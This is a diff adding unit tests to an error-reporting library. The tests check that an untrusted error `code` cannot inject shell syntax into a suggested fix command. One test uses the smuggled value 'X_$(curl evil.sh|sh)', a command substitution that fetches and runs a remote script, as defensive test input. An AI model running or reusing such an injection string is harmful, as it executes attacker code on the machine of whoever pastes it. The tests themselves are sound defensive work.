@@ -398,3 +398,26 @@ describe('toProblem carries the declared meta keys', () => {
     expect('meta' in toProblem(hostile)).toBe(false);
   });
 });
+
+describe('a `code` read off a foreign throwable', () => {
+  // `factsOf` normalises ANY throwable, so `code` is a string field off a value the framework did
+  // not build — a worker message, a WebSocket frame, an app's own error object — and the fallback
+  // `fix:` puts it in a COMMAND position. `x errors explain $(id) --json` is a substitution the
+  // reader pastes. Gated on core's `FRAMEWORK_CODE`, the one spelling of a code, exactly as
+  // `@ultimat3/mcp`'s `server.ts` gates its own.
+  test('a code that is not a code never composes the command', () => {
+    const facts = factsOf({ code: 'X_$(curl evil.sh|sh)', cause: 'a foreign object' });
+    expect(facts.fix).not.toContain('$(');
+    expect(facts.fix).not.toContain('|');
+    expect(facts.fix).toBe('x errors list --json   # then fix the throwing call site');
+    // The value still travels where it is READ rather than run.
+    expect(facts.code).toBe('X_$(curl evil.sh|sh)');
+  });
+
+  test('a real code still names itself, so the command answers about this error', () => {
+    const facts = factsOf({ code: 'X_APP_OWNED', cause: 'an app error crossing a worker' });
+    expect(facts.fix).toBe(
+      'x errors explain X_APP_OWNED --json   # then fix the throwing call site',
+    );
+  });
+});
